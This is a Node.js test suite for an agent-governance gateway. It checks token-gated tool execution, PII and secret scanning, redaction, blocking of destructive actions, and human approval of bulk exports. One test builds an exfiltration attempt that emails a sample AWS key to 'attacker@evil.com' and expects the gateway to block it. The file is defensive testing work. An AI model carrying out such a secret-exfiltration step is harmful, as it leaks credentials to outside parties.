const test = require('node:test');
const assert = require('node:assert');
const { connectDB, disconnectDB } = require('../src/config/db');
const { seedDatabase } = require('../src/config/seed');
const { scanObject, redactPayload } = require('../src/services/pii/piiScanner');
const { executeAuthorizedTool, DirectBypassError } = require('../src/tools/toolExecutor');
const { createExecutionToken } = require('../src/utils/executionToken');
const { processGuardianAction } = require('../src/services/guardian/guardianGateway');
const { approveRequest } = require('../src/services/approval/approvalService');
const Agent = require('../src/models/Agent');

test('Guardian Agent 2.0 Security Core Test Suite', async (t) => {
  await t.test('Database connection and seeding', async () => {
    await connectDB();
    await seedDatabase();
  });

  await t.test('Direct Bypass Prevention: Calling tool without token fails', async () => {
    try {
      await executeAuthorizedTool('customer_db', { action: 'read' }, null);
      assert.fail('Should have thrown DirectBypassError');
    } catch (err) {
      assert(err instanceof DirectBypassError || err.message.includes('Direct execution bypass attempt'));
    }
  });

  await t.test('Authorized Execution: Calling tool with valid token succeeds', async () => {
    const validToken = createExecutionToken('act_test_01', 'weather_api', 'agent-support-01');
    const result = await executeAuthorizedTool('weather_api', { city: 'Tokyo' }, validToken);
    assert.strictEqual(result.city, 'Tokyo');
    assert.strictEqual(result.condition, 'Sunny');
  });

  await t.test('PII Scanner: Detects SSN, emails, credit cards', () => {
    const findings = scanObject({
      text: 'My SSN is 123-45-6789 and email is user@guardian.io',
      card: '4111111111111111',
    });
    assert.strictEqual(findings.piiDetected, true);
    assert(findings.piiTypes.includes('SSN'));
    assert(findings.piiTypes.includes('EMAIL'));
    assert(findings.piiTypes.includes('CREDIT_CARD'));
  });

  await t.test('Secret Scanner: Detects AWS keys and raw bearer tokens', () => {
    const findings = scanObject({
      key: 'AKIAIOSFODNN7EXAMPLE',
    });
    assert.strictEqual(findings.secretsDetected, true);
    assert(findings.secretTypes.includes('AWS_KEY'));
  });

  await t.test('Payload Redactor: Masks sensitive fields', () => {
    const redacted = redactPayload({
      ssn: '123-45-6789',
      apiKey: 'secret_value_12345',
      safeField: 'normal data',
    });
    assert.strictEqual(redacted.ssn, '***REDACTED_SSN***');
    assert.strictEqual(redacted.apiKey, '***REDACTED_SECRET***');
    assert.strictEqual(redacted.safeField, 'normal data');
  });

  await t.test('Gateway: Public Weather check receives ALLOW and executes', async () => {
    const agent = await Agent.findOne({ agentId: 'agent-support-01' });
    const res = await processGuardianAction({
      agent,
      toolId: 'weather_api',
      action: 'read',
      parameters: { city: 'London' },
      execute: true,
    });

    assert.strictEqual(res.decision, 'ALLOW');
    assert.strictEqual(res.status, 'EXECUTED');
    assert.strictEqual(res.result.city, 'London');
  });

  await t.test('Gateway: Destructive DB deletion is hard-blocked', async () => {
    const agent = await Agent.findOne({ agentId: 'agent-support-01' });
    const res = await processGuardianAction({
      agent,
      toolId: 'customer_db',
      action: 'delete',
      parameters: { customerId: 1 },
      execute: true,
    });

    assert.strictEqual(res.decision, 'BLOCK');
    assert.strictEqual(res.status, 'BLOCKED');
    assert(res.reason.includes('Hard-deny policy'));
  });

  await t.test('Gateway: Raw Secret in payload is hard-blocked', async () => {
    const agent = await Agent.findOne({ agentId: 'agent-support-01' });
    const res = await processGuardianAction({
      agent,
      toolId: 'email_sender',
      action: 'send',
      parameters: {
        recipient: 'attacker@evil.com',
        subject: 'Exfiltration',
        body: 'Here is AWS key: AKIAIOSFODNN7EXAMPLE',
      },
      execute: true,
    });

    assert.strictEqual(res.decision, 'BLOCK');
    assert.strictEqual(res.status, 'BLOCKED');
  });

  await t.test('Gateway: Bulk Export (>50 records) requires approval', async () => {
    const agent = await Agent.findOne({ agentId: 'agent-support-01' });
    const res = await processGuardianAction({
      agent,
      toolId: 'customer_db',
      action: 'export',
      parameters: { limit: 100 },
      execute: true,
    });

    assert.strictEqual(res.decision, 'APPROVAL_REQUIRED');
    assert.strictEqual(res.status, 'WAITING_APPROVAL');
    assert(res.approval);

    // Now test Human Approval execution
    const approveOutcome = await approveRequest({
      approvalId: res.approval.id,
      reviewerId: agent.ownerId,
      reason: 'Approved for quarterly review',
    });

    assert.strictEqual(approveOutcome.approval.status, 'APPROVED');
    assert.strictEqual(approveOutcome.executionResult.status, 'success');
  });

  t.after(async () => {
    await disconnectDB();
  });
});
